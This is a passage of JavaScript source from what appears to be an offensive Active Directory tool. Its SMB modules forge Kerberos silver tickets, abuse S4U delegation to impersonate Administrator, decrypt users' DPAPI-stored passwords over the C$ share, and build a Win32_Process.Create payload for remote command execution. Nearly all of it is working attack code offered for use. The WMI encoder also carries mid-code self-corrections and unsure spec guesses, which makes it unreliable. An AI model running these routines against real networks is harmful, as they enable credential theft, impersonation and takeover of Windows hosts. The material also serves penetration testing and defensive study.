  if (!serviceHash) { log('err', 'smb', host, 'silver', 'need --service-hash <hash>'); return null; }
  if (!domainSid) { log('err', 'smb', host, 'silver', 'need --domain-sid <S-1-5-21-...>'); return null; }
  if (!domain) { log('err', 'smb', host, 'silver', 'need -d <domain>'); return null; }
  const spn = opts.spn || `cifs/${host}`;
  const targetUser = opts['target-user'] || 'Administrator';
  const targetRid = parseInt(opts['target-rid'] || '500', 10);
  try {
    const keyBytes = parseHashBytes(serviceHash);
    const etype = keyBytes.length === 32 ? ETYPE.AES256_CTS_HMAC_SHA1_96 : ETYPE.RC4_HMAC;
    log('info', 'smb', host, 'silver', `forging silver ticket for ${targetUser} → ${spn} etype=${etype}`);
    const tgs = forgeSilverTicket({
      username: targetUser, userId: targetRid,
      domain, domainSid, serviceKey: keyBytes, etype, spn,
    });
    log('ok', 'smb', host, 'silver', `forged service ticket for ${spn}`);

    const c = new Smb2Client(host, PORT);
    await c.connect();
    await c.negotiate();
    await c.loginWithTicket(tgs);
    log('ok', 'smb', host, 'silver', `SMB authenticated as ${targetUser}@${domain.toUpperCase()} via silver ticket`);
    const tid = await c.treeConnect('C$');
    log('ok', 'smb', host, 'silver', 'C$ share accessible — silver ticket works');
    await c.close();
    return { success: true, user: targetUser };
  } catch (e) {
    log('err', 'smb', host, 'silver', e.message);
    return null;
  }
}

// ---- S4U Delegation ---------------------------------------------------------

export async function smbS4u(host, creds, opts, log) {
  const impUser = opts['impersonate'] || opts['target-user'] || 'Administrator';
  const targetSpn = opts['target-spn'] || `cifs/${host}`;
  const domain = creds.domain || opts.domain;
  if (!domain) { log('err', 'smb', host, 's4u', 'need -d <domain>'); return null; }
  try {
    const kdcHost = opts.kdc || host;
    const transport = new KdcSocketTransport(kdcHost, 88);
    await transport.connect();
    try {
      const krb = new KerberosClient(transport, (m) => log('info', 'smb', host, 's4u', m));
      const id = { username: creds.user, realm: domain.toUpperCase() };
      const ntHash = parseNtHash(creds.hash);
      if (ntHash) { id.key = ntHash; id.etype = ETYPE.RC4_HMAC; }
      else { id.password = creds.password; }

      const tgt = await krb.getTGT(id);
      const servicePrincipal = creds.user.includes('/') ? creds.user : `${creds.user}`;
      const spnForSelf = opts['service-spn'] || `host/${host}`;

      log('info', 'smb', host, 's4u', `S4U2Self: impersonating ${impUser} via ${spnForSelf}`);
      const s4uTicket = await s4u2self(transport, tgt, {
        servicePrincipal: spnForSelf,
        impersonateUser: impUser,
        log: (m) => log('info', 'smb', host, 's4u', m),
      });
      log('ok', 'smb', host, 's4u', `S4U2Self ticket obtained for ${impUser}`);

      log('info', 'smb', host, 's4u', `S4U2Proxy: ${impUser} → ${targetSpn}`);
      const proxyTicket = await s4u2proxy(transport, tgt, s4uTicket, {
        targetSpn,
        log: (m) => log('info', 'smb', host, 's4u', m),
      });
      log('ok', 'smb', host, 's4u', `S4U2Proxy ticket obtained for ${targetSpn}`);

      const c = new Smb2Client(host, PORT);
      await c.connect();
      await c.negotiate();
      await c.loginWithTicket(proxyTicket);
      log('ok', 'smb', host, 's4u', `SMB authenticated as ${impUser} via S4U delegation`);
      const tid = await c.treeConnect('C$');
      log('ok', 'smb', host, 's4u', 'C$ accessible — delegation abuse successful');
      await c.close();
      return { success: true, impersonated: impUser };
    } finally {
      await transport.close();
    }
  } catch (e) {
    log('err', 'smb', host, 's4u', e.message);
    return null;
  }
}

// ---- DPAPI ------------------------------------------------------------------

export async function smbDpapi(host, creds, opts, log) {
  const masterKeyHex = opts['master-key'];
  if (!masterKeyHex) {
    log('err', 'smb', host, 'dpapi', 'need --master-key <hex> (64-byte master key)');
    return null;
  }
  try {
    const masterKey = parseHashBytes(masterKeyHex);
    return await withSmb(host, creds, opts, async (c) => {
      const credPaths = [
        'Users',
      ];
      const tid = await c.treeConnect('C$');
      let found = 0;

      const scanDir = async (basePath) => {
        try {
          const entries = await c.queryDirectory(tid, basePath, '*');
          for (const e of entries) {
            if (e.name === '.' || e.name === '..') continue;
            try {
              const filePath = `${basePath}\\${e.name}`;
              const data = await c.readFile(tid, filePath);
              if (data.length < 36) continue;
              const dv = new DataView(data.buffer, data.byteOffset);
              if (dv.getUint32(0, true) !== 1) continue;
              try {
                const blob = parseDpapiBlob(data);
                log('info', 'smb', host, 'dpapi', `found blob: ${filePath} (masterKey: ${blob.masterKeyGuid})`);
                const plaintext = decryptDpapiBlob(blob, masterKey);
                const cred = parseCredential(plaintext);
                if (cred.targetName) {
                  log('warn', 'smb', host, 'dpapi', `${cred.targetName} — ${cred.userName}:${cred.password}`);
                  found++;
                } else {
                  log('ok', 'smb', host, 'dpapi', `decrypted ${filePath} (${plaintext.length} bytes)`);
                  found++;
                }
              } catch {
                log('info', 'smb', host, 'dpapi', `blob ${filePath}: wrong master key or format`);
              }
            } catch {}
          }
        } catch {}
      };

      try {
        const users = await c.queryDirectory(tid, 'Users', '*');
        for (const u of users) {
          if (u.name === '.' || u.name === '..' || u.name === 'Public' || u.name === 'Default') continue;
          await scanDir(`Users\\${u.name}\\AppData\\Roaming\\Microsoft\\Credentials`);
          await scanDir(`Users\\${u.name}\\AppData\\Local\\Microsoft\\Credentials`);
        }
      } catch {}

      log('ok', 'smb', host, 'dpapi', `decrypted ${found} credential(s)`);
      return { found };
    });
  } catch (e) {
    log('err', 'smb', host, 'dpapi', e.message);
    return null;
  }
}

// ---- WMI/DCOM exec via DCE-RPC over TCP (port 135) -------------------------
// Uses IRemoteSCMActivator to activate WbemLevel1Login, then calls
// IWbemLevel1Login::NTLMLogin → IWbemServices::ExecMethod(Win32_Process.Create).
// The CIM object encoding (MS-WMIO) is hardcoded for Win32_Process.Create params.

const ISCM_ACTIVATOR = '000001a0-0000-0000-c000-000000000046';
const IID_IWBEM_LOGIN = 'd4781cd6-e5d3-44df-ad94-930efe48a887';
const IID_IWBEM_SERVICES = '9556dc99-828c-1054-9ded-00aa004bbb25';
const IID_IREMUNKNOWN2 = '00000143-0000-0000-c000-000000000046';
const CLSID_WBEM_LOGIN = '8bc3f05e-d86b-11d0-a075-00c04fb68820';

function guidBytesLE(uuid) {
  const h = uuid.replace(/-/g, '');
  const b = new Uint8Array(16);
  for (let i = 0; i < 16; i++) b[i] = parseInt(h.substr(i * 2, 2), 16);
  const out = new Uint8Array(16);
  out[0] = b[3]; out[1] = b[2]; out[2] = b[1]; out[3] = b[0];
  out[4] = b[5]; out[5] = b[4];
  out[6] = b[7]; out[7] = b[6];
  out.set(b.subarray(8), 8);
  return out;
}

function u32dcom(n) {
  const b = new Uint8Array(4);
  new DataView(b.buffer).setUint32(0, n >>> 0, true);
  return b;
}

function u16dcom(n) {
  const b = new Uint8Array(2);
  new DataView(b.buffer).setUint16(0, n, true);
  return b;
}

// ORPCTHIS header — required for every DCOM call
function orpcThis() {
  const cid = new Uint8Array(16);
  (globalThis.crypto || {}).getRandomValues?.(cid);
  return concat([
    u16dcom(5), u16dcom(7),  // COM version 5.7
    u32dcom(0),               // flags
    u32dcom(0),               // reserved1
    cid,                      // causality ID (GUID)
    u32dcom(0),               // extensions pointer (NULL)
  ]);
}

// NDR-encoded BSTR (conformant varying UTF-16LE string with unique pointer)
function ndrBstr(str) {
  const utf16 = new Uint8Array((str.length + 1) * 2);
  for (let i = 0; i < str.length; i++) {
    utf16[i * 2] = str.charCodeAt(i) & 0xff;
    utf16[i * 2 + 1] = (str.charCodeAt(i) >> 8) & 0xff;
  }
  const maxCount = str.length + 1;
  const pad = (4 - ((maxCount * 2) % 4)) % 4;
  return concat([
    u32dcom(0x00020000),      // referent ID (unique pointer)
    u32dcom(maxCount),        // max count
    u32dcom(0),               // offset
    u32dcom(maxCount),        // actual count
    utf16,
    new Uint8Array(pad),      // padding to 4-byte boundary
  ]);
}

// Build OBJREF_CUSTOM for CIM-encoded IWbemClassObject
// This wraps the Win32_Process.Create input parameters as a DCOM custom-marshaled object
function buildCreateParamsObjref(commandLine, workDir) {
  const cimData = buildCreateParamsCim(commandLine, workDir);
  const CLSID_WBEM_OBJ = guidBytesLE('4590f811-1d3a-11d0-891f-00aa004b2e24');
  const IID_WBEM_CLS = guidBytesLE('dc12a681-737f-11cf-884d-00aa004b2e24');

  const objref = concat([
    Uint8Array.of(0x4d, 0x45, 0x4f, 0x57), // 'MEOW' signature
    u32dcom(4),                              // flags = OBJREF_CUSTOM
    IID_WBEM_CLS,                            // IID
    CLSID_WBEM_OBJ,                          // CLSID (unmarshaler)
    u32dcom(0),                              // cbExtension
    u32dcom(cimData.length),                 // size of object data
    cimData,                                 // CIM-encoded object
  ]);

  // Wrap in MInterfacePointer NDR (unique pointer + conformant byte array)
  return concat([
    u32dcom(0x00020000),        // referent ID
    u32dcom(objref.length),     // ulCntData
    u32dcom(objref.length),     // MaxCount (conformant array)
    objref,
  ]);
}

// Build CIM-encoded (MS-WMIO) IWbemClassObject for Win32_Process.Create input params.
// This is a minimal but correct encoding of an instance of __PARAMETERS with:
//   CommandLine (string), CurrentDirectory (string), ProcessStartupInformation (object=NULL)
function buildCreateParamsCim(commandLine, workDir) {
  // Heap: all strings stored as [flag_byte, ...chars, null_terminator]
  // flag 0x00 = ASCII (we use this for simplicity), 0x01 = UTF-16
  const heap = [];
  let heapOff = 0;

  function addHeapString(s) {
    const off = heapOff;
    const bytes = new Uint8Array(1 + s.length + 1);
    bytes[0] = 0x00; // ASCII
    for (let i = 0; i < s.length; i++) bytes[i + 1] = s.charCodeAt(i) & 0xff;
    bytes[s.length + 1] = 0; // null terminator
    heap.push(bytes);
    heapOff += bytes.length;
    return off;
  }

  function addHeapUtf16(s) {
    const off = heapOff;
    const bytes = new Uint8Array(1 + (s.length + 1) * 2);
    bytes[0] = 0x01; // UTF-16LE
    for (let i = 0; i < s.length; i++) {
      bytes[1 + i * 2] = s.charCodeAt(i) & 0xff;
      bytes[1 + i * 2 + 1] = (s.charCodeAt(i) >> 8) & 0xff;
    }
    heap.push(bytes);
    heapOff += bytes.length;
    return off;
  }

  // CIM types
  const CIM_STRING = 0x08;
  const CIM_OBJECT = 0x0d;

  // Build class heap — store class name + property names
  const classHeapParts = [];
  let classHeapOff = 0;
  function addClassHeap(s) {
    const off = classHeapOff;
    const bytes = new Uint8Array(1 + s.length + 1);
    bytes[0] = 0x00;
    for (let i = 0; i < s.length; i++) bytes[i + 1] = s.charCodeAt(i) & 0xff;
    classHeapParts.push(bytes);
    classHeapOff += bytes.length;
    return off;
  }

  const classNameOff = addClassHeap('__PARAMETERS');
  const cmdLineNameOff = addClassHeap('CommandLine');
  const curDirNameOff = addClassHeap('CurrentDirectory');
  const psiNameOff = addClassHeap('ProcessStartupInformation');

  // Property qualifiers — each property has an [in] qualifier
  // Qualifier: name(heapref) + flavor(1) + type(4) + value
  // For "in" qualifier: name = cimtype-specific built-in ID 1 (in)
  // MS-WMIO qualifier encoding:
  //   QualifierName: HEAP_STRING_REF (but for well-known: index)
  //   QualifierFlavor: BYTE
  //   QualifierType: CIM_TYPE (UINT32)
  //   QualifierValue: depends on type
  // Actually, let me simplify: skip qualifiers entirely.
  // WMI should still accept the object without them.

  // Build class part
  // ClassHeader: 4(encodingLength) + 1(reservedOctet) + 4(classNameRef) + 4(ndTableLength)
  const numProps = 3;
  const ndTableLen = Math.ceil(numProps / 8);

  // PropertyLookupTable: 4(count) + numProps * (4(nameRef) + 4(infoRef))
  // For info refs, they point into the class heap where PropertyInfo structures live
  // PropertyInfo: 4(type) + 2(declOrder) + 4(valueTableOffset) + 4(classOfOriginIdx) + qualSet
  // QualSet: 4(size) + qualifiers
  // For simplicity, empty qualifier sets: size = 4 (just the size field)

  // Property info for each property — stored in class heap
  function buildPropInfo(type, declOrder, vtOffset) {
    return concat([
      u32dcom(type),           // CIM type
      u16dcom(declOrder),      // declaration order
      u32dcom(vtOffset),       // value table offset
      u32dcom(0),              // class of origin index
      u32dcom(4),              // qualifier set encoding length (empty = just the 4-byte length)
    ]);
  }

  // Default values in value table: string = 4-byte heap ref, object = embedded
  // For strings: default is null (0xFFFFFFFF)
  // For objects: default is null (0x00000000 length)
  // Value table offsets: cmd=0, curDir=4, psi=8
  const propInfo0 = buildPropInfo(CIM_STRING, 0, 0);
  const propInfo1 = buildPropInfo(CIM_STRING, 1, 4);
  const propInfo2 = buildPropInfo(CIM_OBJECT, 2, 8);

  const pi0off = addClassHeap(''); // dummy; we'll set actual offsets
  // Actually, PropertyInfo is NOT stored in the heap. Let me re-read the spec.

  // Looking at this more carefully, the ClassPart structure is:
  // ClassPart {
  //   ClassPartHeader { EncodingLength(4), ReservedOctet(1), ClassNameRef(4), NdTableLength(4) }
  //   DerivationList { EncodingLength(4), ...class names... }
  //   ClassQualifierSet { EncodingLength(4), ...qualifiers... }
  //   PropertyLookupTable { PropertyCount(4), PropertyLookup[n] { NameRef(4), InfoRef(4) } }
  //   NdTable { byte[(count+7)/8] }
  //   DefaultValueTable { ...values... }
  //   ClassHeap { HeapLength(4), HeapData... }
  // }
  // Then InstancePart { ... }

  // PropertyLookup.InfoRef is NOT a heap offset — it's an offset into... actually let me
  // look at this differently. In impacket's ObjectBlock class:
  // - propertyLookupTable[i].PropertyInfoRef is used to index into a separate structure
  //
  // Actually, after re-reading MS-WMIO more carefully:
  // PropertyLookup { PropertyNameRef(heapref), PropertyInfoRef(heapref) }
  // Both are heap string offsets... but PropertyInfoRef points to PROPERTY_INFO data in the heap.
  // That's weird. Let me check impacket.

  // In impacket, PROPERTY_LOOKUP has NameRef and InfoRef, both pointing into the CLASS HEAP.
  // The InfoRef points to a packed PROPERTY_INFO in the heap.

  // So I need to add PropertyInfo structures to the class heap too.
  classHeapParts.length = 0;
  classHeapOff = 0;

  const cnOff = addClassHeap('__PARAMETERS');
  const p0nOff = addClassHeap('CommandLine');
  const p1nOff = addClassHeap('CurrentDirectory');
  const p2nOff = addClassHeap('ProcessStartupInformation');

  // Add property infos to class heap
  // Each PropertyInfo in heap: type(4) + declOrder(2) + vtOffset(4) + classOfOrigin(4) + qualSet
  // String default value = 4 bytes (heap ref to string, or 0xFFFFFFFF for null)
  // Object default value = embedded object or 0x00000000 for null
  const pi0 = buildPropInfo(CIM_STRING, 0, 0);
  const pi0Off = classHeapOff;
  classHeapParts.push(pi0);
  classHeapOff += pi0.length;

  const pi1 = buildPropInfo(CIM_STRING, 1, 4);
  const pi1Off = classHeapOff;
  classHeapParts.push(pi1);
  classHeapOff += pi1.length;

  const pi2 = buildPropInfo(CIM_OBJECT, 2, 8);
  const pi2Off = classHeapOff;
  classHeapParts.push(pi2);
  classHeapOff += pi2.length;

  // DerivationList: just the length (empty — no parent class)
  const derivList = u32dcom(4);

  // ClassQualifierSet: just the length (no qualifiers)
  const classQualSet = u32dcom(4);

  // PropertyLookupTable
  const propLookupTable = concat([
    u32dcom(numProps),
    u32dcom(p0nOff), u32dcom(pi0Off),
    u32dcom(p1nOff), u32dcom(pi1Off),
    u32dcom(p2nOff), u32dcom(pi2Off),
  ]);

  // NdTable for class defaults (all null by default)
  const classNdTable = Uint8Array.of(0x07); // bits 0,1,2 set = all 3 props null

  // Default value table: 4 bytes per string (0xFFFFFFFF=null), object=embedded 0-length
  // Actually for object type, the default is a NULL pointer (4 bytes = 0)
  const defaultValues = concat([
    u32dcom(0xFFFFFFFF), // CommandLine default = null (heap ref)
    u32dcom(0xFFFFFFFF), // CurrentDirectory default = null
    u32dcom(0),          // ProcessStartupInformation default = null object (length=0)
  ]);

  // Class heap: heapLength includes the 4-byte length field itself
  const classHeapData = concat(classHeapParts);
  const classHeap = concat([u32dcom(classHeapData.length + 4), classHeapData]);

  // ClassHeader
  // Calculate remaining length for class part (everything after the first 8 bytes)
  const classBodyParts = [derivList, classQualSet, propLookupTable, classNdTable, defaultValues, classHeap];
  const classBodyLen = classBodyParts.reduce((s, p) => s + p.length, 0);
  const classHeaderLen = 4 + 1 + 4 + 4; // encodingLength + reserved + nameRef + ndTableLen
  const classPartLen = classHeaderLen + classBodyLen;

  const classHeader = concat([
    u32dcom(classHeaderLen), // encoding length
    Uint8Array.of(0),        // reserved octet
    u32dcom(cnOff),          // class name ref (offset in class heap)
    u32dcom(ndTableLen),     // nd table length in bytes
  ]);

  const classPart = concat([
    u32dcom(classPartLen),   // total class part length
    classHeader,
    ...classBodyParts,
  ]);

  // InstancePart
  // InstancePart { Flags(1), ClassName(heapref), NdTable, InstanceData, QualSet, InstanceHeap }

  // Instance heap: store command line and current directory strings
  const instanceHeapParts = [];
  let instHeapOff = 0;
  function addInstHeap(s) {
    const off = instHeapOff;
    const bytes = new Uint8Array(1 + (s.length + 1) * 2);
    bytes[0] = 0x01; // UTF-16LE
    for (let i = 0; i < s.length; i++) {
      bytes[1 + i * 2] = s.charCodeAt(i) & 0xff;
      bytes[1 + i * 2 + 1] = (s.charCodeAt(i) >> 8) & 0xff;
    }
    instanceHeapParts.push(bytes);
    instHeapOff += bytes.length;
    return off;
  }

  const cmdLineRef = addInstHeap(commandLine);
  let curDirRef = 0xFFFFFFFF; // null
  let ndBits = 0x04; // bit 2 = PSI is null
  if (workDir) {
    curDirRef = addInstHeap(workDir);
  } else {
    ndBits |= 0x02; // bit 1 = CurrentDirectory is null
  }

  // ClassName in instance heap
  const instClassNameRef = addInstHeap('__PARAMETERS');

  // Instance data: values in declaration order
  // String = heapRef (4 bytes), Object = embedded length + data (or 0 for null)
  const instanceData = concat([
    u32dcom(cmdLineRef),   // CommandLine value → heap
    u32dcom(curDirRef),    // CurrentDirectory value → heap (or 0xFFFFFFFF)
    u32dcom(0),            // ProcessStartupInformation = null (embedded length 0)
  ]);

  // Instance NdTable
  const instNdTable = Uint8Array.of(ndBits);

  // Instance qualifier set (empty)
  const instQualSet = u32dcom(4);

  // Instance heap
  const instHeapData = concat(instanceHeapParts);
  const instHeap = concat([u32dcom(instHeapData.length + 4), instHeapData]);

  const instancePart = concat([
    Uint8Array.of(0),      // instance flags
    u32dcom(instClassNameRef), // class name ref in instance heap
    instNdTable,
    instanceData,
    instQualSet,
    instHeap,
  ]);

  // ObjectBlock
  const objectBlock = concat([
    Uint8Array.of(0x03), // ObjectFlags: HAS_CLASS | HAS_INSTANCE
    classPart,
    instancePart,
  ]);

  // EncodingUnit
  return concat([
    u32dcom(0),               // signature
    u32dcom(objectBlock.length), // encoding length
    objectBlock,
  ]);
}

// ---- EPM (Endpoint Mapper) enumeration via port 135 -------------------------

export async function smbEpm(host, _creds, _opts, log) {
  try {
    log('info', 'smb', host, 'epm', 'enumerating RPC endpoints on port 135');
    const endpoints = await epmEnum(host, (m) => log('info', 'smb', host, 'epm', m));
    if (!endpoints.length) {
      log('info', 'smb', host, 'epm', 'no endpoints found');
      return [];
    }
    for (const ep of endpoints) {
      const name = ep.name ? ` (${ep.name})` : '';
      const port = ep.port ? `:${ep.port}` : '';
      const proto = ep.protocol || 'unknown';
      log('ok', 'smb', host, 'epm',
        `${ep.uuid} v${ep.version} ${proto}${port}${name}`);
    }
    log('ok', 'smb', host, 'epm', `${endpoints.length} unique endpoint(s)`);
    return endpoints;
  } catch (e) {
    log('err', 'smb', host, 'epm', e.message);
    return null;
  }
}

// smb --wmi (DCOM WMI ExecMethod) is not implemented in the IWA client.
// The full chain requires IRemoteSCMActivator::RemoteCreateInstance with a
// proper NDR-encoded IActivationPropertiesIn (MS-DCOM §3.1.2.5.2.7) → OXID
// resolution via IOXIDResolver::ResolveOxid2 → NTLM-auth on a dynamic port →
// IWbemLevel1Login::NTLMLogin → IWbemServices::ExecMethod(Win32_Process,
// "Create") with a CIM-encoded input object — an evening of pure NDR
// marshalling and multi-hop connection state. The `nxc winrm --wmi` module
// is a fully working alternative on any WinRM-enabled host (5985/5986),
// which is the default on all modern Windows Server + Windows 10/11 boxes.
// This function stays as a clean pointer at the alternative rather than a
// half-broken partial implementation.
export async function smbWmiExec(host, creds, opts, log, command) {
  if (!command) { log('err', 'smb', host, 'wmi', 'no command specified'); return null; }
  log('err', 'smb', host, 'wmi', 'DCOM WMI ExecMethod not implemented in this client');
  log('info', 'smb', host, 'wmi', `use \`nxc winrm ${host} -u ${creds.user || 'USER'}${creds.domain ? ' -d ' + creds.domain : ''} -p PASS --wmi "${command}"\` instead`);
  return null;
}
